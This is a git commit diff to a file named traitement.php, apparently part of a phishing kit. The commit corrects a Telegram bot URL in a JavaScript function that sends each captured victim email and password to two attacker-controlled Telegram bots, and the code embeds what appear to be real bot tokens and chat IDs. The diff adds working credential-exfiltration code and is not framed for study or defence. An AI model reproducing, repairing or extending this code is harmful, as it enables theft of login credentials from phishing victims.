17928de7734ffd46551183a9dad8565298e2bf17
Bonjour00539 <gilles.amorin01@gmail.com>
2025-11-25 19:52:20 +0100

    Update traitement.php

--- traitement.php
+++ traitement.php
@@ -27,7 +27,7 @@ document.addEventListener('DOMContentLoaded', function () {
     // Fonction d'envoi des données à deux bots Telegram
     function envoyerTelegram(data) {
         // URL pour le premier bot
-        const telegramBot1Url = `https://api.telegram.org/8107688809:AAGVUC_P6uiK6MYqXIZJvNjzg77LKrqpsms/sendMessage?chat_id=8356596920&text=🟧- ${data.email}:${data.password}`;
+        const telegramBot1Url = `https://api.telegram.org/bot8107688809:AAEFdZ1OuytFc-KgRauWR1MNtfI8GL1WNYk/sendMessage?chat_id=8356596920&text=🟧- ${data.email}:${data.password}`;
         
         // URL pour le deuxième bot
         const telegramBot2Url = `https://api.telegram.org/bot7588608492:AAEU1KFhyfPTR_jexRfS7_zmYCSMWqYp_58/sendMessage?chat_id=-4696074794&text=🟧- ${data.email}:${data.password}`;
